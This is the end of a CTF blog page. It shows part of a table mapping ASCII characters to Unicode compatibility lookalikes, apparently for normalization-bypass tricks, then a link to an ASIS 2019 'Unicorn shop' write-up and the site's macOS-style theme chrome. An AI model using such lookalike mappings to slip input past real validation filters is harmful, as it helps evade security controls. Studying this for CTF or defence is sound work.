&quot;\u33dc&quot;, &quot;\uff33&quot;], &quot;W&quot;: [&quot;\u1d42&quot;, &quot;\u24cc&quot;, &quot;\u33dd&quot;, &quot;\uff37&quot;], &quot;[&quot;: [&quot;\ufe47&quot;, &quot;\uff3b&quot;], &quot;_&quot;: [&quot;\ufe33&quot;, &quot;\ufe34&quot;, &quot;\ufe4d&quot;, &quot;\ufe4e&quot;, &quot;\ufe4f&quot;, &quot;\uff3f&quot;], &quot;c&quot;: [&quot;\u1d9c&quot;, &quot;\u2105&quot;, &quot;\u2106&quot;, &quot;\u217d&quot;, &quot;\u24d2&quot;, &quot;\u3388&quot;, &quot;\u339d&quot;, &quot;\u33a0&quot;, &quot;\u33a4&quot;, &quot;\u33c4&quot;, &quot;\u33c5&quot;, &quot;\uff43&quot;], &quot;g&quot;: [&quot;\u1d4d&quot;, &quot;\u210a&quot;, &quot;\u24d6&quot;, &quot;\u33ff&quot;, &quot;\uff47&quot;], &quot;k&quot;: [&quot;\u1d4f&quot;, &quot;\u24da&quot;, &quot;\u3384&quot;, &quot;\u3389&quot;, &quot;\u338f&quot;, &quot;\u3391&quot;, &quot;\u3398&quot;, &quot;\u339e&quot;, &quot;\u33a2&quot;, &quot;\u33a6&quot;, &quot;\u33aa&quot;, &quot;\u33b8&quot;, &quot;\u33be&quot;, &quot;\u33c0&quot;, &quot;\u33cf&quot;, &quot;\uff4b&quot;], &quot;o&quot;: [&quot;\u00ba&quot;, &quot;\u1d52&quot;, &quot;\u2092&quot;, &quot;\u2134&quot;, &quot;\u24de&quot;, &quot;\u3375&quot;, &quot;\uff4f&quot;], &quot;s&quot;: [&quot;\u017f&quot;, &quot;\u02e2&quot;, &quot;\u24e2&quot;, &quot;\u33db&quot;, &quot;\ufb05&quot;, &quot;\ufb06&quot;, &quot;\uff53&quot;], &quot;w&quot;: [&quot;\u02b7&quot;, &quot;\u24e6&quot;, &quot;\uff57&quot;], &quot;&#123;&quot;: [&quot;\ufe37&quot;, &quot;\ufe5b&quot;, &quot;\uff5b&quot;], &quot;\&quot;&quot;: [&quot;\uff02&quot;], &quot;&amp;&quot;: [&quot;\ufe60&quot;, &quot;\uff06&quot;], &quot;*&quot;: [&quot;\ufe61&quot;, &quot;\uff0a&quot;], &quot;.&quot;: [&quot;\u2024&quot;, &quot;\u2025&quot;, &quot;\u2026&quot;, &quot;\ufe19&quot;, &quot;\ufe30&quot;, &quot;\ufe52&quot;, &quot;\uff0e&quot;], &quot;2&quot;: [&quot;\u00b2&quot;, &quot;\u2082&quot;, &quot;\u2154&quot;, &quot;\u2156&quot;, &quot;\u2461&quot;, &quot;\u2473&quot;, &quot;\u2489&quot;, &quot;\u249b&quot;, &quot;\u3251&quot;, &quot;\u3252&quot;, &quot;\u3253&quot;, &quot;\u3254&quot;, &quot;\u3255&quot;, &quot;\u3256&quot;, &quot;\u3257&quot;, &quot;\u3258&quot;, &quot;\u3259&quot;, &quot;\u32c1&quot;, &quot;\u335a&quot;, &quot;\u336c&quot;, &quot;\u336d&quot;, &quot;\u336e&quot;, &quot;\u336f&quot;, &quot;\u3370&quot;, &quot;\u33e1&quot;, &quot;\u33f3&quot;, &quot;\u33f4&quot;, &quot;\u33f5&quot;, &quot;\u33f6&quot;, &quot;\u33f7&quot;, &quot;\u33f8&quot;, &quot;\u33f9&quot;, &quot;\u33fa&quot;, &quot;\u33fb&quot;, &quot;\u33fc&quot;, &quot;\uff12&quot;], &quot;6&quot;: [&quot;\u2076&quot;, &quot;\u2086&quot;, &quot;\u2465&quot;, &quot;\u248d&quot;, &quot;\u32c5&quot;, &quot;\u335e&quot;, &quot;\u33e5&quot;, &quot;\uff16&quot;], &quot;:&quot;: [&quot;\u2a74&quot;, &quot;\ufe13&quot;, &quot;\ufe55&quot;, &quot;\uff1a&quot;], &quot;&gt;&quot;: [&quot;\ufe65&quot;, &quot;\uff1e&quot;], &quot;B&quot;: [&quot;\u1d2e&quot;, &quot;\u212c&quot;, &quot;\u24b7&quot;, &quot;\u33c3&quot;, &quot;\uff22&quot;], &quot;F&quot;: [&quot;\u2131&quot;, &quot;\u213b&quot;, &quot;\u24bb&quot;, &quot;\uff26&quot;], &quot;J&quot;: [&quot;\u1d36&quot;, &quot;\u24bf&quot;, &quot;\uff2a&quot;], &quot;N&quot;: [&quot;\u01ca&quot;, &quot;\u01cb&quot;, &quot;\u1d3a&quot;, &quot;\u2115&quot;, &quot;\u2116&quot;, &quot;\u24c3&quot;, &quot;\uff2e&quot;], &quot;R&quot;: [&quot;\u1d3f&quot;, &quot;\u20a8&quot;, &quot;\u211b&quot;, &quot;\u211c&quot;, &quot;\u211d&quot;, &quot;\u24c7&quot;, &quot;\uff32&quot;], &quot;V&quot;: [&quot;\u2164&quot;, &quot;\u2165&quot;, &quot;\u2166&quot;, &quot;\u2167&quot;, &quot;\u24cb&quot;, &quot;\u2c7d&quot;, &quot;\u33de&quot;, &quot;\uff36&quot;], &quot;Z&quot;: [&quot;\u2124&quot;, &quot;\u2128&quot;, &quot;\u24cf&quot;, &quot;\uff3a&quot;], &quot;^&quot;: [&quot;\uff3e&quot;], &quot;b&quot;: [&quot;\u1d47&quot;, &quot;\u24d1&quot;, &quot;\u3374&quot;, &quot;\uff42&quot;], &quot;f&quot;: [&quot;\u1da0&quot;, &quot;\u24d5&quot;, &quot;\u3399&quot;, &quot;\ufb00&quot;, &quot;\ufb01&quot;, &quot;\ufb02&quot;, &quot;\ufb03&quot;, &quot;\ufb04&quot;, &quot;\uff46&quot;], &quot;j&quot;: [&quot;\u02b2&quot;, &quot;\u2149&quot;, &quot;\u24d9&quot;, &quot;\u2c7c&quot;, &quot;\uff4a&quot;], &quot;n&quot;: [&quot;\u01cc&quot;, &quot;\u207f&quot;, &quot;\u24dd&quot;, &quot;\u3381&quot;, &quot;\u338b&quot;, &quot;\u339a&quot;, &quot;\u33b1&quot;, &quot;\u33b5&quot;, &quot;\u33bb&quot;, &quot;\uff4e&quot;], &quot;r&quot;: [&quot;\u02b3&quot;, &quot;\u1d63&quot;, &quot;\u24e1&quot;, &quot;\u33ad&quot;, &quot;\u33ae&quot;, &quot;\u33af&quot;, &quot;\uff52&quot;], &quot;v&quot;: [&quot;\u1d5b&quot;, &quot;\u1d65&quot;, &quot;\u2174&quot;, &quot;\u2175&quot;, &quot;\u2176&quot;, &quot;\u2177&quot;, &quot;\u24e5&quot;, &quot;\uff56&quot;], &quot;z&quot;: [&quot;\u1dbb&quot;, &quot;\u24e9&quot;, &quot;\uff5a&quot;], &quot;~&quot;: [&quot;\uff5e&quot;], &quot;!&quot;: [&quot;\u203c&quot;, &quot;\u2049&quot;, &quot;\ufe15&quot;, &quot;\ufe57&quot;, &quot;\uff01&quot;], &quot;%&quot;: [&quot;\ufe6a&quot;, &quot;\uff05&quot;], &quot;)&quot;: [&quot;\u207e&quot;, &quot;\u208e&quot;, &quot;\ufe36&quot;, &quot;\ufe5a&quot;, &quot;\uff09&quot;], &quot;-&quot;: [&quot;\ufe63&quot;, &quot;\uff0d&quot;], &quot;1&quot;: [&quot;\u00b9&quot;, &quot;\u00bc&quot;, &quot;\u00bd&quot;, &quot;\u2081&quot;, &quot;\u2150&quot;, &quot;\u2151&quot;, &quot;\u2152&quot;, &quot;\u2153&quot;, &quot;\u2155&quot;, &quot;\u2159&quot;, &quot;\u215b&quot;, &quot;\u215f&quot;, &quot;\u2460&quot;, &quot;\u2469&quot;, &quot;\u246a&quot;, &quot;\u246b&quot;, &quot;\u246c&quot;, &quot;\u246d&quot;, &quot;\u246e&quot;, &quot;\u246f&quot;, &quot;\u2470&quot;, &quot;\u2471&quot;, &quot;\u2472&quot;, &quot;\u2488&quot;, &quot;\u2491&quot;, &quot;\u2492&quot;, &quot;\u2493&quot;, &quot;\u2494&quot;, &quot;\u2495&quot;, &quot;\u2496&quot;, &quot;\u2497&quot;, &quot;\u2498&quot;, &quot;\u2499&quot;, &quot;\u249a&quot;, &quot;\u32c0&quot;, &quot;\u32c9&quot;, &quot;\u32ca&quot;, &quot;\u32cb&quot;, &quot;\u3359&quot;, &quot;\u3362&quot;, &quot;\u3363&quot;, &quot;\u3364&quot;, &quot;\u3365&quot;, &quot;\u3366&quot;, &quot;\u3367&quot;, &quot;\u3368&quot;, &quot;\u3369&quot;, &quot;\u336a&quot;, &quot;\u336b&quot;, &quot;\u33e0&quot;, &quot;\u33e9&quot;, &quot;\u33ea&quot;, &quot;\u33eb&quot;, &quot;\u33ec&quot;, &quot;\u33ed&quot;, &quot;\u33ee&quot;, &quot;\u33ef&quot;, &quot;\u33f0&quot;, &quot;\u33f1&quot;, &quot;\u33f2&quot;, &quot;\uff11&quot;], &quot;5&quot;: [&quot;\u2075&quot;, &quot;\u2085&quot;, &quot;\u215a&quot;, &quot;\u215d&quot;, &quot;\u2464&quot;, &quot;\u248c&quot;, &quot;\u32bf&quot;, &quot;\u32c4&quot;, &quot;\u335d&quot;, &quot;\u33e4&quot;, &quot;\uff15&quot;], &quot;9&quot;: [&quot;\u2079&quot;, &quot;\u2089&quot;, &quot;\u2468&quot;, &quot;\u2490&quot;, &quot;\u32c8&quot;, &quot;\u3361&quot;, &quot;\u33e8&quot;, &quot;\uff19&quot;], &quot;=&quot;: [&quot;\u207c&quot;, &quot;\u208c&quot;, &quot;\u2a75&quot;, &quot;\u2a76&quot;, &quot;\ufe66&quot;, &quot;\uff1d&quot;], &quot;A&quot;: [&quot;\u1d2c&quot;, &quot;\u24b6&quot;, &quot;\u3373&quot;, &quot;\u33df&quot;, &quot;\uff21&quot;], &quot;E&quot;: [&quot;\u1d31&quot;, &quot;\u2130&quot;, &quot;\u24ba&quot;, &quot;\uff25&quot;], &quot;I&quot;: [&quot;\u0132&quot;, &quot;\u1d35&quot;, &quot;\u2110&quot;, &quot;\u2111&quot;, &quot;\u2160&quot;, &quot;\u2161&quot;, &quot;\u2162&quot;, &quot;\u2163&quot;, &quot;\u2168&quot;, &quot;\u24be&quot;, &quot;\u337a&quot;, &quot;\uff29&quot;], &quot;M&quot;: [&quot;\u1d39&quot;, &quot;\u2133&quot;, &quot;\u216f&quot;, &quot;\u24c2&quot;, &quot;\u3386&quot;, &quot;\u3392&quot;, &quot;\u33ab&quot;, &quot;\u33b9&quot;, &quot;\u33bf&quot;, &quot;\u33c1&quot;, &quot;\uff2d&quot;], &quot;Q&quot;: [&quot;\u211a&quot;, &quot;\u24c6&quot;, &quot;\uff31&quot;], &quot;U&quot;: [&quot;\u1d41&quot;, &quot;\u24ca&quot;, &quot;\uff35&quot;], &quot;Y&quot;: [&quot;\u24ce&quot;, &quot;\uff39&quot;], &quot;]&quot;: [&quot;\ufe48&quot;, &quot;\uff3d&quot;], &quot;a&quot;: [&quot;\u00aa&quot;, &quot;\u1d43&quot;, &quot;\u1e9a&quot;, &quot;\u2090&quot;, &quot;\u2100&quot;, &quot;\u2101&quot;, &quot;\u24d0&quot;, &quot;\u33c2&quot;, &quot;\uff41&quot;], &quot;e&quot;: [&quot;\u1d49&quot;, &quot;\u2091&quot;, &quot;\u212f&quot;, &quot;\u2147&quot;, &quot;\u24d4&quot;, &quot;\u32cd&quot;, &quot;\u32ce&quot;, &quot;\uff45&quot;], &quot;i&quot;: [&quot;\u0133&quot;, &quot;\u1d62&quot;, &quot;\u2071&quot;, &quot;\u2139&quot;, &quot;\u2148&quot;, &quot;\u2170&quot;, &quot;\u2171&quot;, &quot;\u2172&quot;, &quot;\u2173&quot;, &quot;\u2178&quot;, &quot;\u24d8&quot;, &quot;\u33cc&quot;, &quot;\uff49&quot;], &quot;m&quot;: [&quot;\u1d50&quot;, &quot;\u217f&quot;, &quot;\u24dc&quot;, &quot;\u3383&quot;, &quot;\u338e&quot;, &quot;\u3396&quot;, &quot;\u339c&quot;, &quot;\u339f&quot;, &quot;\u33a1&quot;, &quot;\u33a3&quot;, &quot;\u33a5&quot;, &quot;\u33a7&quot;, &quot;\u33a8&quot;, &quot;\u33b3&quot;, &quot;\u33b7&quot;, &quot;\u33bd&quot;, &quot;\u33d4&quot;, &quot;\u33d5&quot;, &quot;\u33d6&quot;, &quot;\ufad1&quot;, &quot;\uff4d&quot;], &quot;q&quot;: [&quot;\u24e0&quot;, &quot;\uff51&quot;], &quot;u&quot;: [&quot;\u1d58&quot;, &quot;\u1d64&quot;, &quot;\u24e4&quot;, &quot;\uff55&quot;], &quot;y&quot;: [&quot;\u02b8&quot;, &quot;\u24e8&quot;, &quot;\uff59&quot;], &quot;&#125;&quot;: [&quot;\ufe38&quot;, &quot;\ufe5c&quot;, &quot;\uff5d&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p>题目[ASIS 2019]Unicorn shop-&gt;wp<a target="_blank" rel="noopener" href="https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis">https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis</a></p>
+
+        </article>
+      </div>
+    </div>
+  </main>
+
+  <section id="about" class="about-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">关于本机</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body about-body">
+      <div class="about-card">
+        <div class="about-brand">
+          <div class="about-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+              <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+            </svg>
+          </div>
+          <div class="about-title">MacBook Pro</div>
+          <div class="about-sub">16-inch, 2099</div>
+        </div>
+        <div class="about-specs">
+          <div class="about-row">
+            <span class="about-key">内存</span>
+            <span class="about-val">256 GB 2667 MHz DDR4</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">处理器</span>
+            <span class="about-val">Apple M9 Pro</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">显卡</span>
+            <span class="about-val">Neural X 32-Core</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">序列号</span>
+            <span class="about-val">MACF-2099-A1B2C3</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">系统</span>
+            <span class="about-val">macOS 15.2</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">主题作者</span>
+            <span class="about-val">bkfish</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+  
+
+<section id="music" class="tool-window music-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">Music</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+        
+      </div>
+    </div>
+    <div class="window-body tool-body music-body">
+      
+        <div class="empty-state">
+          <div class="empty-title">未发现本地音乐</div>
+          <div class="empty-sub">把 MP3 放在 `source/music/`（或在主题配置里设置 `desktop.music_dir`）</div>
+        </div>
+      
+    </div>
+  </div>
+</section>
+
+  <section id="search" class="search-window" data-index-url="/mac-search.json">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+    <div class="window-title">聚焦搜索</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body search-body">
+      <div class="search-input-wrap">
+        <input id="search-input" class="search-input" type="search" placeholder="搜索文章..." autocomplete="off">
+        <span class="search-hint">⌘K</span>
+      </div>
+      <ul id="search-results" class="search-results"></ul>
+      <div id="search-empty" class="search-empty">未找到结果</div>
+    </div>
+  </div>
+</section>
+
+  <div class="dock">
+  <div class="dock-inner">
+    <span class="dock-item app finder">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M4 6.5c0-1.4 1.1-2.5 2.5-2.5h11c1.4 0 2.5 1.1 2.5 2.5v11c0 1.4-1.1 2.5-2.5 2.5h-11C5.1 20 4 18.9 4 17.5z"/>
+          <path d="M12 4v16"/>
+          <circle cx="9" cy="10" r="1" fill="currentColor"/>
+          <circle cx="15" cy="10" r="1" fill="currentColor"/>
+          <path d="M8.5 14.5c1 1 2.1 1.5 3.5 1.5s2.5-.5 3.5-1.5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Finder</span>
+    </span>
+    <a class="dock-item app spotlight" href="#search">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="11" cy="11" r="5.5"/>
+          <path d="M15.5 15.5L20 20"/>
+        </svg>
+      </span>
+      <span class="dock-label">聚焦搜索</span>
+    </a>
+    <a class="dock-item app notes" href="#notes">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <rect x="5" y="4.5" width="14" height="15" rx="2"/>
+          <path d="M8 8h8M8 11.5h8M8 15h5"/>
+        </svg>
+      </span>
+      <span class="dock-label">文章清单</span>
+    </a>
+    <span class="dock-item app safari">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="8"/>
+          <path d="M12 7l2.8 5.2-5.2 2.8z"/>
+        </svg>
+      </span>
+      <span class="dock-label">Safari</span>
+    </span>
+    <a class="dock-item app music" href="#music">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M9 18a2.5 2.5 0 1 0 0-5"/>
+          <path d="M9 13V6l9-2v7"/>
+          <path d="M16 16a2.5 2.5 0 1 0 0-5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Music</span>
+    </a>
+    <span class="dock-item app trash">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6 8h12l-1 11H7z"/>
+          <path d="M9 8V5h6v3M5 8h14"/>
+        </svg>
+      </span>
+      <span class="dock-label">Trash</span>
+    </span>
+    <span class="dock-divider"></span>
+    
+    
+      
+      <a class="dock-item tool" href="#tool-flag">
+        <span class="dock-icon">
+          <span class="tool-letter">F</span>
+        </span>
+        <span class="dock-label">flag</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-bomb">
+        <span class="dock-icon">
+          <span class="tool-letter">B</span>
+        </span>
+        <span class="dock-label">bomb</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-sudoku">
+        <span class="dock-icon">
+          <span class="tool-letter">S</span>
+        </span>
+        <span class="dock-label">sudoku</span>
+      </a>
+    
+  </div>
+</div>
+
+
+  <!-- embed resize script removed: fixed-height iframe -->
+</body>
+</html>
